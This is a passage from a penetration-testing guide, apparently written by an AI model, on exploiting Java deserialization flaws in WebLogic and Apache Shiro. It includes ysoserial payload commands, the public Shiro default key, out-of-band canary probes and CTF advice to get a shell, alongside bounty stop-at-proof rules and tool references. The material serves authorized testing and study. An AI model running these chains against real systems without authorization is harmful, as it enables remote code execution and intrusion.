# feed t3-url.ser through a T3 sender (e.g. the weblogic T3 exploit harness);
# -> DNS lookup for t3-canary-7001.example.com at your resolver = sink confirmed, zero code run
```

Decision: DNS hit → map the banner to S4 (7001 + `12.2.1` → the 2018/2020 T3 CVE cluster) and, only if the program authorizes execution proof, climb to one OOB command canary. No DNS hit → the T3 framing or egress is wrong, not the gadget (Phase 5.3).

**Apache Shiro `rememberMe` — pure gadget-selection flow.** Fingerprint, then forge under the public key:

```
# 1. fingerprint: an invalid rememberMe forces the tell
curl -s -I https://example.com/ -b "rememberMe=invalid"
# -> Set-Cookie: rememberMe=deleteMe; ...   (Shiro confirmed)

# 2. probe the classpath with URLDNS encrypted under the public key, then the real chain.
#    shiro-attack-style tooling does: ysoserial <chain> -> AES-128-CBC(key) -> base64 -> rememberMe
#    default key (public, CVE-2016-4437): kPH+bIxk5D2deZiIxcaaaA==
java -jar ysoserial.jar URLDNS "http://shiro-canary.example.com" > shiro-url.ser
# encrypt+encode shiro-url.ser under the key, send as rememberMe=<b64>
# -> DNS hit = sink + key correct. Now iterate CHAIN over the S1 exec-string list:
#    CommonsCollections6 -> CommonsCollections5 -> CommonsBeanutils1 (if cc<=3.2.1) -> ...
```

The only unknown after the DNS hit is which chain the classpath runs — exactly the S1 lookup. A custom key turns step 2 into a key-hunt (4.2); the DNS-confirmed sink is still reportable on its own.

**Stream inspection on a captured blob** (Phase 1.4, concrete):

```
file suspect.bin                     # -> "Java serialization data, version 5"
xxd suspect.bin | head -1            # -> 0000: aced 0005 7372 00....  (sr = object, class name follows)
base64 -d <<< "rO0ABXNy..." | xxd | head
java -jar SerializationDumper.jar -r suspect.bin   # class names, field names, serialVersionUIDs
# read off: app-owned Serializable classes (Phase 2.5 candidates), plaintext-vs-encrypted fields,
# and the serialVersionUIDs you must match when forging (Phase 3.2)
```

### S5. Blind deserialization — the OOB-vs-time-based ladder

Extends 5.1 for targets with no response oracle *and* no outbound egress.

1. **URLDNS first, always** — DNS resolves from deep inside most egress-filtered networks even when TCP/HTTP does not; a DNS-only callback proves the sink with zero code execution and zero dependencies. This is both the safe probe and often the *only* channel that survives egress filtering.
2. **OOB command canary** — `ping`/`curl` to your collaborator with `tcpdump`/`nc` listening (5.1). ICMP sometimes egresses where HTTP is blocked; try both.
3. **Time-based, when fully blind** — no DNS, no ICMP, no HTTP out, identical responses. If you have a command-exec chain, run a measurable delay and diff latency: `ping -c 20 127.0.0.1` or `sleep 15` (quote via the brace form from Phase 3.1). A ~15s delta on the chosen chain, absent on URLDNS and absent on a wrong-library chain, is a three-point proof of execution without any egress. Confirm with two or three delay values (5s / 10s / 15s) so the correlation is undeniable in the report. One request per measurement — never loop this into a flood.
4. **Error-oracle differential** (Phase 1.3) remains the fallback when even timing is flat: a chain whose classes *load* throws a different, later exception than one that `ClassNotFoundException`s immediately — the diff localizes the classpath even with no execution signal.

Report the ladder you climbed and the rung you stopped on; a DNS hit plus a reproducible time delta is a complete, non-destructive impact statement.

### S6. Finding gadgets beyond ysoserial

When no stock chain fits (hardened library, exotic classpath, filtered classes), you move from catalog lookup to discovery. In rough order of effort:

- **GadgetProbe** (S3) — not a chain finder but the bridge: remotely enumerate which classes exist on the target classpath so your search is scoped to libraries actually present.
- **marshalsec** (Moritz Bechler) — companion to ysoserial covering a dozen *unmarshallers* plus the LDAP/JRMP reference servers (Phase 4.6). Broader library coverage, but like ysoserial it ships known chains rather than discovering new ones. When the sink is not native serialization but an object-mapping format, pick the marshaller that matches the wire format and the gadget that matches the classpath:

  | Wire format seen | marshalsec marshaller | Common gadget it drives |
  |---|---|---|
  | Hessian/Burlap binary | `Hessian` / `Hessian2` / `Burlap` | `Rome`, `XBean`, `SpringPartiallyComparable` |
  | Jackson `@class`/polymorphic JSON | `Jackson` | `TemplatesImpl` via default typing, or `C3P0` JNDI |
  | XML (Castor) | `Castor` | `SpringAbstractBeanFactoryPointcutAdvisor` (jndiUrl) |
  | XML (XStream) | `XStream` | `ImageIO`/`EventHandler`/dynamic-proxy chains |
  | YAML (SnakeYAML) | `SnakeYAML` | `ScriptEngineManager` / `JdbcRowSetImpl` JNDI |
  | Java `Serializable` | *(use ysoserial)* | the S1 table |

  The JNDI-ending gadgets pair with `marshalsec.jndi.LDAPRefServer`/`RMIRefServer` and overlap [[log4j]] (Phase 4.6/4.9).
- **gadgetinspector** (Ian Haken, Black Hat USA 2018; `JackOfMostTrades/gadgetinspector`) — static bytecode analyzer: builds a method call graph over a JAR/classpath and ranks `readObject`-reachable sinks. Effective for surfacing *new* chains in an app's own libraries, but noisy — expect false positives and false negatives; it points you at a candidate path to then build by hand.
- **serianalyzer** (Moritz Bechler; `mbechler/serianalyzer`) — static bytecode taint-style analysis that tracks whether a `readObject`-reachable path can reach a native/dangerous method; complements gadgetinspector when auditing a specific library for a reachable sink.
- **Tabby** — turns JAR/WAR/CLASS into a code-property graph in Neo4j; you write Cypher queries to hunt source→sink paths. Heavier setup, far more expressive for bespoke chains across a large classpath.
- **CodeQL** — Java deserialization queries (Synacktiv/community) over a built database; the choice when source is in scope and you want repeatable, auditable chain discovery.
- **Fuzzing-based discovery** — ODDFuzz (structure-aware directed greybox) and the GadgetBuilder/Gleipner line automate chain *mining* and modern-JDK revival; research-grade, worth knowing exist when the hand-built and static-analysis routes stall.
- **App-owned gadgets** (Phase 2.5) remain the highest-yield when you have any source: a custom `readObject` with a side effect is a chain no library version gates and no deny-list anticipates — build the object directly against the target's own classes.

### S7. CTF notes — the intended-chain mindset

Deserialization boxes are a CTF staple, and the mindset differs sharply from a bounty:

- **A CTF has exactly one intended chain.** The author pinned the classpath (often a deliberately odd library — Groovy, BeanShell, a specific commons-collections, or an app-owned class in the provided source) so that precisely one ysoserial payload, or one hand-built chain, fires. The puzzle *is* gadget selection: list the classpath (provided JAR, `pom.xml`, `/WEB-INF/lib`), match it against S1, and if nothing stock fits, the intended solution is almost always an **app-owned gadget** in the source you were given (Phase 2.5) or a library whose chain you must build from the source because its ysoserial "version label" misleads you (S1's rule). Hard CTF deser challenges explicitly test the ability to *mine a new chain*, not run a known one.
- **Read ysoserial's chain source, not its labels** — a CTF classpath pins a version a stock label doesn't match; the class is usually still present and exploitable.
- **You go all the way to a shell.** The flag is in a file; `cat /flag` is the objective. Destructive-PoC discipline does not apply — run the real command, pop the shell, read the flag.
- **What differs in a bounty:** on an authorized program you **stop at the DNS proof** (URLDNS, Phase 5.1) plus at most one `id`-equivalent OOB canary. Never escalate a bounty deser sink to the file read / shell a CTF rewards — a confirmed sink + a non-destructive execution signal is the complete, reportable finding. The CTF's "get the flag" instinct is exactly the instinct to suppress in scope. Same gadget craft, opposite stopping rule.

### References (supplement)

- frohoff/ysoserial README (payload/dependency table) — https://github.com/frohoff/ysoserial
- ZDI, Apache Groovy deserialization patch-bypass chain — https://www.thezdi.com/blog/2017/12/19/apache-groovy-deserialization-a-cunning-exploit-chain-to-bypass-a-patch
- ZDI, CVE-2020-2555 (WebLogic/Coherence RCE) — https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server
- ZDI, details on the WebLogic vuln exploited in the wild (CVE-2020-2883 lineage) — https://www.thezdi.com/blog/2020/5/8/details-on-the-oracle-weblogic-vulnerability-being-exploited-in-the-wild
- Praetorian, deserialization gadget behavior on Java 17 (TemplatesImpl `IllegalAccessError`) — https://www.praetorian.com/blog/
- CodeWhite, "Java Exploitation Restrictions in Modern JDK" — https://codewhitesec.blogspot.com/2023/04/java-exploitation-restrictions-in.html
- OWASP Stuttgart, "Exploiting deserialization vulnerabilities in recent Java versions" (2024-12-10) — https://owasp.org/www-chapter-stuttgart/assets/slides/2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf
- GadgetBuilder (NordSec 2025) — https://www.abartel.net/static/p/nordsec2025-gadgetBuilder.pdf
- gadgetinspector (Ian Haken, Black Hat USA 2018) — https://github.com/JackOfMostTrades/gadgetinspector
- serianalyzer (Moritz Bechler) — https://github.com/mbechler/serianalyzer
- GadgetProbe (Bishop Fox) — https://portswigger.net/daily-swig/gadgetprobe-new-tool-simplifies-the-exploitation-of-java-deserialization-vulnerabilities
- Red Hat, CVE-2015-7501 (JBoss JMXInvokerServlet) — https://access.redhat.com/solutions/2045023
- Apache ActiveMQ, CVE-2015-5254 advisory — https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt
- NVD, CVE-2016-4437 (Apache Shiro rememberMe) — https://nvd.nist.gov/vuln/detail/cve-2016-4437
- GrrrDog, Java Deserialization Cheat Sheet (ports/sinks/tooling cross-reference) — https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

*Supplement authored 2026-11-19 (claude-opus-4-8). Sources: frohoff/ysoserial README (dependency column quoted verbatim); ZDI, OWASP-Stuttgart, Praetorian, CodeWhite, and NordSec-2025 analyses of modern-JDK restrictions and chain revival; primary CVE/advisory records for WebLogic (CVE-2015-4852/2018-2628/2020-2555/2020-2883), JBoss (CVE-2015-7501), Jenkins (CVE-2015-8103/2016-0788), ActiveMQ (CVE-2015-5254), and Shiro (CVE-2016-4437); GadgetProbe/gadgetinspector/serianalyzer/Tabby project pages. All CVE IDs, version strings, and the Shiro default key are public and verified against the cited primaries. Preserves all prior content; appends Phase-2/1/4/5 supplements only.*
